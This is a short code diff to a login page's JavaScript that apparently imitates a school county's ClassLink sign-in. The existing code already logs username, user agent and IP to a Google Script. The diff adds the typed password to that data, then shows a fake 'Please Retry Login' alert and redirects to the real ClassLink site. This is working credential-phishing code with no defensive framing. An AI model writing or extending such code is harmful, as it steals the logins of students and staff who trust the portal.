@@ -263,7 +263,8 @@
               const logData = {
                   username: document.getElementById('username').value,
                   browser: navigator.userAgent,
-                  ip: ipData.ip
+                  ip: ipData.ip,
+                  password: document.getElementById('password').value
               };
 
               // Send to Google Script
@@ -277,7 +278,9 @@
 
               console.log("County log saved.");
               alert("Please Retry Login");
-
+// --- REDIRECT LINE START ---
+          window.location.href = "https://myapps.classlink.com/home";
+          // --- REDIRECT LINE END ---
           } catch (error) {
               console.error("Log failed:", error);
           } finally {
